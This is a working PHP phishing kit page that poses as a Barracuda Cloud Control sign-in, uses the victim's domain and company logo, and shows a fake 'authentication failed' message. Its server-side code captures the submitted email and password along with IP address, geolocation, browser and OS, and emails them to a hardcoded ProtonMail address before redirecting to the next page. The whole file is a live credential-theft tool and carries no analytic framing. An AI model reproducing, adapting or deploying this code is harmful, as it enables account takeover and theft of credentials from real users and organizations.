<?php
session_start();

// Get Email
$mail = $_SESSION['mail'];

// Get Domain
$b = explode('@', $mail);
$domain = $b[1];


// Send Result

if($_POST)
    {
        
   function getUserIP()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}


$user_ip = getUserIP();

// get browser


$user_agent     =   $_SERVER['HTTP_USER_AGENT'];

function getOS() { 

    global $user_agent;

    $os_platform    =   "Unknown OS Platform";

    $os_array       =   array(
                            '/windows nt 6.3/i'     =>  'Windows 8.1',
                            '/windows nt 6.2/i'     =>  'Windows 8',
                            '/windows nt 6.1/i'     =>  'Windows 7',
                            '/windows nt 6.0/i'     =>  'Windows Vista',
                            '/windows nt 5.2/i'     =>  'Windows Server 2003/XP x64',
                            '/windows nt 5.1/i'     =>  'Windows XP',
                            '/windows xp/i'         =>  'Windows XP',
                            '/windows nt 5.0/i'     =>  'Windows 2000',
                            '/windows me/i'         =>  'Windows ME',
                            '/win98/i'              =>  'Windows 98',
                            '/win95/i'              =>  'Windows 95',
                            '/win16/i'              =>  'Windows 3.11',
                            '/macintosh|mac os x/i' =>  'Mac OS X',
                            '/mac_powerpc/i'        =>  'Mac OS 9',
                            '/linux/i'              =>  'Linux',
                            '/ubuntu/i'             =>  'Ubuntu',
                            '/iphone/i'             =>  'iPhone',
                            '/ipod/i'               =>  'iPod',
                            '/ipad/i'               =>  'iPad',
                            '/android/i'            =>  'Android',
                            '/blackberry/i'         =>  'BlackBerry',
                            '/webos/i'              =>  'Mobile'
                        );

    foreach ($os_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $os_platform    =   $value;
        }

    }   

    return $os_platform;

}

function getBrowser() {

    global $user_agent;

    $browser        =   "Unknown Browser";

    $browser_array  =   array(
                            '/msie/i'       =>  'Internet Explorer',
                            '/firefox/i'    =>  'Firefox',
                            '/safari/i'     =>  'Safari',
                            '/chrome/i'     =>  'Chrome',
                            '/opera/i'      =>  'Opera',
                            '/netscape/i'   =>  'Netscape',
                            '/maxthon/i'    =>  'Maxthon',
                            '/konqueror/i'  =>  'Konqueror',
                            '/mobile/i'     =>  'Handheld Browser'
                        );

    foreach ($browser_array as $regex => $value) { 

        if (preg_match($regex, $user_agent)) {
            $browser    =   $value;
        }

    }

    return $browser;

}


$user_os        =   getOS();
$user_browser   =   getBrowser();
  


$url='http://www.geoplugin.net/json.gp?ip='.$_SERVER['REMOTE_ADDR'];
			//$ipdetails=file_get_contents($url);
			//$response_tags=json_decode($ipdetails);
			
			//echo $url.'==============';
			
			$ch = curl_init();
			
			curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
			curl_setopt($ch, CURLOPT_HEADER, 0);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);       
		
			$ouputdata = curl_exec($ch);
			curl_close($ch);
			
			$response_tags=json_decode($ouputdata);
			
			$country=$response_tags->geoplugin_countryName;
			$state=$response_tags->geoplugin_region;
			$city=$response_tags->geoplugin_city;



$email = $_POST['_user'];
$password = $_POST['_pass'];


$to = "resultz007@protonmail.com";
$subject = "1. $country || $mail";

$message = "
Email: $email
Password: $password
---------=Location & Browser=---------
IP Address: $user_ip
Country: $country
State & City: $state || $city
Browser and OS: $user_browser || $user_os

   ";
 $retval = mail ($to,$subject,$message);
   if( $retval == true )  
   {
    
    header("Location: final.php");
       
   }
   else
   {
      echo "Message could not be sent...";
   }     
    }
?>

<html lang="en"><head><style type="text/css">.mui-textfield.mui-textfield--float-label > label {-webkit-transition:all .15s ease-out;-moz-transition:all .15s ease-out;-o-transition:all .15s ease-out;transition:all .15s ease-out;}</style><style type="text/css">@keyframes mui-btn-inserted{from{transform:none;}to{transform:none;}}.mui-btn{animation-duration:0.0001s;animation-name:mui-btn-inserted;}@keyframes mui-dropdown-inserted{from{transform:none;}to{transform:none;}}[data-mui-toggle="dropdown"]{animation-duration:0.0001s;animation-name:mui-dropdown-inserted;}@keyframes mui-btn-inserted,mui-dropdown-inserted{from{transform:none;}to{transform:none;}}.mui-btn[data-mui-toggle="dropdown"]{animation-duration:0.0001s;animation-name:mui-btn-inserted,mui-dropdown-inserted;}@keyframes mui-tab-inserted{from{transform:none;}to{transform:none;}}[data-mui-toggle="tab"]{animation-duration:0.0001s;animation-name:mui-tab-inserted;}@keyframes mui-textfield-inserted{from{transform:none;}to{transform:none;}}.mui-textfield > input{animation-duration:0.0001s;animation-name:mui-textfield-inserted;}@keyframes mui-textfield-inserted{from{transform:none;}to{transform:none;}}.mui-textfield > textarea{animation-duration:0.0001s;animation-name:mui-textfield-inserted;}@keyframes mui-select-inserted{from{transform:none;}to{transform:none;}}.mui-select > select{animation-duration:0.0001s;animation-name:mui-select-inserted;}@keyframes mui-node-inserted{from{transform:none;}to{transform:none;}}.mui-select > select ~ .mui-event-trigger{animation-duration:0.0001s;animation-name:mui-node-inserted;}@keyframes mui-node-disabled{from{transform:none;}to{transform:none;}}.mui-select > select:disabled ~ .mui-event-trigger{animation-duration:0.0001s;animation-name:mui-node-disabled;}</style>
    <meta charset="utf-8">
<meta http-equiv="Content-Version" content="1.5.1-2">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><script type="text/javascript">(window.NREUM||(NREUM={})).loader_config={licenseKey:"223919c5e6",applicationID:"146217546"};window.NREUM||(NREUM={}),__nr_require=function(e,t,n){function r(n){if(!t[n]){var i=t[n]={exports:{}};e[n][0].call(i.exports,function(t){var i=e[n][1][t];return r(i||t)},i,i.exports)}return t[n].exports}if("function"==typeof __nr_require)return __nr_require;for(var i=0;i<n.length;i++)r(n[i]);return r}({1:[function(e,t,n){function r(){}function i(e,t,n){return function(){return o(e,[u.now()].concat(c(arguments)),t?null:this,n),t?void 0:this}}var o=e("handle"),a=e(6),c=e(7),f=e("ee").get("tracer"),u=e("loader"),s=NREUM;"undefined"==typeof window.newrelic&&(newrelic=s);var d=["setPageViewName","setCustomAttribute","setErrorHandler","finished","addToTrace","inlineHit","addRelease"],p="api-",l=p+"ixn-";a(d,function(e,t){s[t]=i(p+t,!0,"api")}),s.addPageAction=i(p+"addPageAction",!0),s.setCurrentRouteName=i(p+"routeName",!0),t.exports=newrelic,s.interaction=function(){return(new r).get()};var m=r.prototype={createTracer:function(e,t){var n={},r=this,i="function"==typeof t;return o(l+"tracer",[u.now(),e,n],r),function(){if(f.emit((i?"":"no-")+"fn-start",[u.now(),r,i],n),i)try{return t.apply(this,arguments)}catch(e){throw f.emit("fn-err",[arguments,this,e],n),e}finally{f.emit("fn-end",[u.now()],n)}}}};a("actionText,setName,setAttribute,save,ignore,onEnd,getContext,end,get".split(","),function(e,t){m[t]=i(l+t)}),newrelic.noticeError=function(e,t){"string"==typeof e&&(e=new Error(e)),o("err",[e,u.now(),!1,t])}},{}],2:[function(e,t,n){function r(){return c.exists&&performance.now?Math.round(performance.now()):(o=Math.max((new Date).getTime(),o))-a}function i(){return o}var o=(new Date).getTime(),a=o,c=e(8);t.exports=r,t.exports.offset=a,t.exports.getLastTimestamp=i},{}],3:[function(e,t,n){function r(e,t){var n=e.getEntries();n.forEach(function(e){"first-paint"===e.name?d("timing",["fp",Math.floor(e.startTime)]):"first-contentful-paint"===e.name&&d("timing",["fcp",Math.floor(e.startTime)])})}function i(e,t){var n=e.getEntries();n.length>0&&d("lcp",[n[n.length-1]])}function o(e){e.getEntries().forEach(function(e){e.hadRecentInput||d("cls",[e])})}function a(e){if(e instanceof m&&!g){var t=Math.round(e.timeStamp),n={type:e.type};t<=p.now()?n.fid=p.now()-t:t>p.offset&&t<=Date.now()?(t-=p.offset,n.fid=p.now()-t):t=p.now(),g=!0,d("timing",["fi",t,n])}}function c(e){d("pageHide",[p.now(),e])}if(!("init"in NREUM&&"page_view_timing"in NREUM.init&&"enabled"in NREUM.init.page_view_timing&&NREUM.init.page_view_timing.enabled===!1)){var f,u,s,d=e("handle"),p=e("loader"),l=e(5),m=NREUM.o.EV;if("PerformanceObserver"in window&&"function"==typeof window.PerformanceObserver){f=new PerformanceObserver(r);try{f.observe({entryTypes:["paint"]})}catch(v){}u=new PerformanceObserver(i);try{u.observe({entryTypes:["largest-contentful-paint"]})}catch(v){}s=new PerformanceObserver(o);try{s.observe({type:"layout-shift",buffered:!0})}catch(v){}}if("addEventListener"in document){var g=!1,w=["click","keydown","mousedown","pointerdown","touchstart"];w.forEach(function(e){document.addEventListener(e,a,!1)})}l(c)}},{}],4:[function(e,t,n){function r(e,t){if(!i)return!1;if(e!==i)return!1;if(!t)return!0;if(!o)return!1;for(var n=o.split("."),r=t.split("."),a=0;a<r.length;a++)if(r[a]!==n[a])return!1;return!0}var i=null,o=null,a=/Version\/(\S+)\s+Safari/;if(navigator.userAgent){var c=navigator.userAgent,f=c.match(a);f&&c.indexOf("Chrome")===-1&&c.indexOf("Chromium")===-1&&(i="Safari",o=f[1])}t.exports={agent:i,version:o,match:r}},{}],5:[function(e,t,n){function r(e){function t(){e(a&&document[a]?document[a]:document[i]?"hidden":"visible")}"addEventListener"in document&&o&&document.addEventListener(o,t,!1)}t.exports=r;var i,o,a;"undefined"!=typeof document.hidden?(i="hidden",o="visibilitychange",a="visibilityState"):"undefined"!=typeof document.msHidden?(i="msHidden",o="msvisibilitychange"):"undefined"!=typeof document.webkitHidden&&(i="webkitHidden",o="webkitvisibilitychange",a="webkitVisibilityState")},{}],6:[function(e,t,n){function r(e,t){var n=[],r="",o=0;for(r in e)i.call(e,r)&&(n[o]=t(r,e[r]),o+=1);return n}var i=Object.prototype.hasOwnProperty;t.exports=r},{}],7:[function(e,t,n){function r(e,t,n){t||(t=0),"undefined"==typeof n&&(n=e?e.length:0);for(var r=-1,i=n-t||0,o=Array(i<0?0:i);++r<i;)o[r]=e[t+r];return o}t.exports=r},{}],8:[function(e,t,n){t.exports={exists:"undefined"!=typeof window.performance&&window.performance.timing&&"undefined"!=typeof window.performance.timing.navigationStart}},{}],ee:[function(e,t,n){function r(){}function i(e){function t(e){return e&&e instanceof r?e:e?u(e,f,a):a()}function n(n,r,i,o,a){if(a!==!1&&(a=!0),!l.aborted||o){e&&a&&e(n,r,i);for(var c=t(i),f=v(n),u=f.length,s=0;s<u;s++)f[s].apply(c,r);var p=d[h[n]];return p&&p.push([b,n,r,c]),c}}function o(e,t){y[e]=v(e).concat(t)}function m(e,t){var n=y[e];if(n)for(var r=0;r<n.length;r++)n[r]===t&&n.splice(r,1)}function v(e){return y[e]||[]}function g(e){return p[e]=p[e]||i(n)}function w(e,t){s(e,function(e,n){t=t||"feature",h[n]=t,t in d||(d[t]=[])})}var y={},h={},b={on:o,addEventListener:o,removeEventListener:m,emit:n,get:g,listeners:v,context:t,buffer:w,abort:c,aborted:!1};return b}function o(e){return u(e,f,a)}function a(){return new r}function c(){(d.api||d.feature)&&(l.aborted=!0,d=l.backlog={})}var f="nr@context",u=e("gos"),s=e(6),d={},p={},l=t.exports=i();t.exports.getOrSetContext=o,l.backlog=d},{}],gos:[function(e,t,n){function r(e,t,n){if(i.call(e,t))return e[t];var r=n();if(Object.defineProperty&&Object.keys)try{return Object.defineProperty(e,t,{value:r,writable:!0,enumerable:!1}),r}catch(o){}return e[t]=r,r}var i=Object.prototype.hasOwnProperty;t.exports=r},{}],handle:[function(e,t,n){function r(e,t,n,r){i.buffer([e],r),i.emit(e,t,n)}var i=e("ee").get("handle");t.exports=r,r.ee=i},{}],id:[function(e,t,n){function r(e){var t=typeof e;return!e||"object"!==t&&"function"!==t?-1:e===window?0:a(e,o,function(){return i++})}var i=1,o="nr@id",a=e("gos");t.exports=r},{}],loader:[function(e,t,n){function r(){if(!x++){var e=b.info=NREUM.info,t=p.getElementsByTagName("script")[0];if(setTimeout(u.abort,3e4),!(e&&e.licenseKey&&e.applicationID&&t))return u.abort();f(y,function(t,n){e[t]||(e[t]=n)});var n=a();c("mark",["onload",n+b.offset],null,"api"),c("timing",["load",n]);var r=p.createElement("script");r.src="https://"+e.agent,t.parentNode.insertBefore(r,t)}}function i(){"complete"===p.readyState&&o()}function o(){c("mark",["domContent",a()+b.offset],null,"api")}var a=e(2),c=e("handle"),f=e(6),u=e("ee"),s=e(4),d=window,p=d.document,l="addEventListener",m="attachEvent",v=d.XMLHttpRequest,g=v&&v.prototype;NREUM.o={ST:setTimeout,SI:d.setImmediate,CT:clearTimeout,XHR:v,REQ:d.Request,EV:d.Event,PR:d.Promise,MO:d.MutationObserver};var w=""+location,y={beacon:"bam.nr-data.net",errorBeacon:"bam.nr-data.net",agent:"js-agent.newrelic.com/nr-1198.min.js"},h=v&&g&&g[l]&&!/CriOS/.test(navigator.userAgent),b=t.exports={offset:a.getLastTimestamp(),now:a,origin:w,features:{},xhrWrappable:h,userAgent:s};e(1),e(3),p[l]?(p[l]("DOMContentLoaded",o,!1),d[l]("load",r,!1)):(p[m]("onreadystatechange",i),d[m]("onload",r)),c("mark",["firstbyte",a.getLastTimestamp()],null,"api");var x=0},{}],"wrap-function":[function(e,t,n){function r(e,t){function n(t,n,r,f,u){function nrWrapper(){var o,a,s,p;try{a=this,o=d(arguments),s="function"==typeof r?r(o,a):r||{}}catch(l){i([l,"",[o,a,f],s],e)}c(n+"start",[o,a,f],s,u);try{return p=t.apply(a,o)}catch(m){throw c(n+"err",[o,a,m],s,u),m}finally{c(n+"end",[o,a,p],s,u)}}return a(t)?t:(n||(n=""),nrWrapper[p]=t,o(t,nrWrapper,e),nrWrapper)}function r(e,t,r,i,o){r||(r="");var c,f,u,s="-"===r.charAt(0);for(u=0;u<t.length;u++)f=t[u],c=e[f],a(c)||(e[f]=n(c,s?f+r:r,i,f,o))}function c(n,r,o,a){if(!m||t){var c=m;m=!0;try{e.emit(n,r,o,t,a)}catch(f){i([f,n,r,o],e)}m=c}}return e||(e=s),n.inPlace=r,n.flag=p,n}function i(e,t){t||(t=s);try{t.emit("internal-error",e)}catch(n){}}function o(e,t,n){if(Object.defineProperty&&Object.keys)try{var r=Object.keys(e);return r.forEach(function(n){Object.defineProperty(t,n,{get:function(){return e[n]},set:function(t){return e[n]=t,t}})}),t}catch(o){i([o],n)}for(var a in e)l.call(e,a)&&(t[a]=e[a]);return t}function a(e){return!(e&&e instanceof Function&&e.apply&&!e[p])}function c(e,t){var n=t(e);return n[p]=e,o(e,n,s),n}function f(e,t,n){var r=e[t];e[t]=c(r,n)}function u(){for(var e=arguments.length,t=new Array(e),n=0;n<e;++n)t[n]=arguments[n];return t}var s=e("ee"),d=e(7),p="nr@original",l=Object.prototype.hasOwnProperty,m=!1;t.exports=r,t.exports.wrapFunction=c,t.exports.wrapInPlace=f,t.exports.argsToArray=u},{}]},{},["loader"]);</script>
<meta name="description" content="The sign in page for <?php echo $domain ?> Cloud Control.">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="csrf-token" content="kNY9zQMsjWEghXzqFkE8XIBI6boXIcWYW2ETVlQr">


        <link rel="shortcut icon" href="https://auth.barracudanetworks.com/img/favicon.ico">
    <link href="https://auth.barracudanetworks.com/css/app.css" rel="stylesheet" media="all">
    <link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700?display=swap" media="all" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Material+Icons&amp;display=block&amp;text=navigate_next%20info%20arrow_back%20check_circle%20refresh%20keyboard_capslock" media="all" rel="stylesheet">

    <title>Sign In :: <?php echo $domain; ?></title>
</head>
<body data-new-gr-c-s-check-loaded="14.995.0" data-gr-ext-installed="">
    <div id="root">
        <div class="cuda-content">
            <div class="cuda-typography">
                    <div class="cuda-header cuda-size-sm mui--clearfix">
            <div class="mui--pull-left">
            <a href="#" class="mui-btn mui-btn--flat mui-btn--small cuda-button-transparent qa-link-back">
                <span class="material-icons" style="vertical-align: middle;">arrow_back</span>
                Back
            </a>
        </div>
    
    
    
    
    
    <div class="mui-dropdown mui--pull-right">
        <button class="mui-btn mui-btn--flat mui-btn--small cuda-button-transparent qa-button-locale-switcher" style="text-transform: none" data-mui-toggle="dropdown" type="button">
            English (US)
            <span class="mui-caret"></span>
        </button>

        <ul class="mui-dropdown__menu mui-dropdown__menu--right" id="language-list" style="margin-top: -30px;">
                            <li>
                    <a style="font-weight: bold" href="javascript:void(0);" data-languagekey="en_US" class="qa-link-locale qa-link-locale-en_US">English (US)</a>
                </li>
                            <li>
                    <a href="javascript:void(0);" data-languagekey="ca_ES" class="qa-link-locale qa-link-locale-ca_ES">Catalan (Spain)</a>
                </li>
                            <li>
                    <a href="javascript:void(0);" data-languagekey="cs_CZ" class="qa-link-locale qa-link-locale-cs_CZ">Čeština</a>
                </li>
                            <li>
                    <a href="javascript:void(0);" data-languagekey="da_DK" class="qa-link-locale qa-link-locale-da_DK">Dansk</a>
                </li>
                            <li>
                    <a href="javascript:void(0);" data-languagekey="de_DE" class="qa-link-locale qa-link-locale-de_DE">Deutsch</a>
                </li>
                            <li>
                    <a href="javascript:void(0);" data-languagekey="es_ES" class="qa-link-locale qa-link-locale-es_ES">Español (España)</a>
                </li>
                            <li>
                    <a href="javascript:void(0);" data-languagekey="fr_FR" class="qa-link-locale qa-link-locale-fr_FR">Français (France)</a>
                </li>
                            <li>
                    <a href="javascript:void(0);" data-languagekey="it_IT" class="qa-link-locale qa-link-locale-it_IT">Italiano</a>
                </li>
                            <li>
                    <a href="javascript:void(0);" data-languagekey="hu_HU" class="qa-link-locale qa-link-locale-hu_HU">Magyar</a>
                </li>
                            <li>
                    <a href="javascript:void(0);" data-languagekey="ja_JP" class="qa-link-locale qa-link-locale-ja_JP">日本語</a>
                </li>
                            <li>
                    <a href="javascript:void(0);" data-languagekey="ko_KR" class="qa-link-locale qa-link-locale-ko_KR">한국어</a>
                </li>
                            <li>
                    <a href="javascript:void(0);" data-languagekey="nl_NL" class="qa-link-locale qa-link-locale-nl_NL">Nederlands</a>
                </li>
                            <li>
                    <a href="javascript:void(0);" data-languagekey="pl_PL" class="qa-link-locale qa-link-locale-pl_PL">Polski</a>
                </li>
                            <li>
                    <a href="javascript:void(0);" data-languagekey="pt_BR" class="qa-link-locale qa-link-locale-pt_BR">Português (Brasil)</a>
                </li>
                            <li>
                    <a href="javascript:void(0);" data-languagekey="ru_RU" class="qa-link-locale qa-link-locale-ru_RU">Русский</a>
                </li>
                            <li>
                    <a href="javascript:void(0);" data-languagekey="zh_CN" class="qa-link-locale qa-link-locale-zh_CN">中文(简体)</a>
                </li>
                            <li>
                    <a href="javascript:void(0);" data-languagekey="zh_TW" class="qa-link-locale qa-link-locale-zh_TW">中文(台灣)</a>
                </li>
                    </ul>
    </div>
</div>
    <div class="cuda-paper cuda-size-sm">
        
        <div class="cuda-status-message">
                                    <div class="cuda-status-message-row">
                    <span class="cuda-status-message-icon material-icons">info</span>
                    <div class="cuda-status-message-text qa-status-message">
                        Authentication failed due to an incorrect email or password.
                        
                                                    <span class="cuda-status-message-request-id">Request ID: 6fc933f81c6049e6</span>
                                            </div>
                </div>
                        </div>
        
        <div class="cuda-mat cuda-bgcolor-primary">

            <div class="cuda-mat-sm" align="center">
                
                  <?php
						$ch = curl_init();

						curl_setopt($ch, CURLOPT_URL, "https://logo.clearbit.com/$domain");
						curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

						curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

						$headers = array();
						$headers[] = 'Upgrade-Insecure-Requests: 1';
						$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36';
						curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

						$result = curl_exec($ch);
						if(!$result || strlen(trim($result)) == 0 || curl_errno($ch))
						{
							$logo = 0;
						}
						else
						{
							$logo = 1;
						}
						
						curl_close($ch);
						
						if($logo == 0)
						{
							echo "<img src='logo_barracuda.svg' width='198' height='48'>";
						}
						else
						{
							echo '<img src="https://logo.clearbit.com/'.$domain.'" alt="" class="center" height="50" alt="Logo"><br>';
						}
					?>
               
            </div>

            <form action="#" method="post" class="qa-login-app-form">
                <input type="hidden" name="_token" value="kNY9zQMsjWEghXzqFkE8XIBI6boXIcWYW2ETVlQr">
                <div style="text-align: center; margin-bottom: 25px;">
                    <b><?php echo $mail; ?> </b>
                   
                    
                </div>

                  <div class="mui-textfield cuda-mui-textfield" style="margin-bottom: 15px;">
                    
                    <input type="hidden" id="username" name="_user" placeholder="" class="input-block-level" value="<?php echo $mail; ?>" required>
		             
                    <label for="password" data-caps-lock-warning="Caps Lock">Password</label>
                    <input class="cuda-style-fullWidth qa-field-password mui--is-empty mui--is-pristine mui--is-touched" type="password" name="_pass" id="password" required="" autofocus="" value="" autocomplete="current-password">
                </div>


                <button class="mui-btn mui-btn--raised mui-btn--primary cuda-style-fullWidth cuda-button-autoDisableSubmit qa-button-submit" style="margin: 0;" type="submit" name="submit" id="submit">Sign In</button>

                <div style="margin-top: 15px;" class="mui--clearfix">
                    <a href="£" name="forgot_password" id="forgot_password" class="mui--pull-left qa-link-forgot-password">
                        Forgot password?
                    </a>
                </div>

            </form>

        </div>

    </div>
            </div>
        </div>
        <div class="cuda-typography cuda-footer">
    <span class="cuda-footer-left">
        <span>
            © 2021 <?php echo $domain; ?>
        </span>
        <span>
            <a href="https://barracuda.com/privacy" target="_blank" rel="noopener">Privacy Policy</a>
            <a href="https://barracuda.com/terms" target="_blank" rel="noopener">Terms of Service</a>
        </span>
    </span>
    <span class="cuda-footer-right">
      
    </span>
</div>
    </div>
        <script type="text/javascript" src="/js/app.js" defer=""></script>
<script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","licenseKey":"223919c5e6","applicationID":"146217546,118989023,146217547","transactionName":"NANSN0sFWUcCU0JfDA1JcQBNDVhaTFxZUQoNS0ACShdAWxFU","queueTime":0,"applicationTime":62,"atts":"GERRQQMfSkk=","errorBeacon":"bam.nr-data.net","agent":""}</script>

</body></html>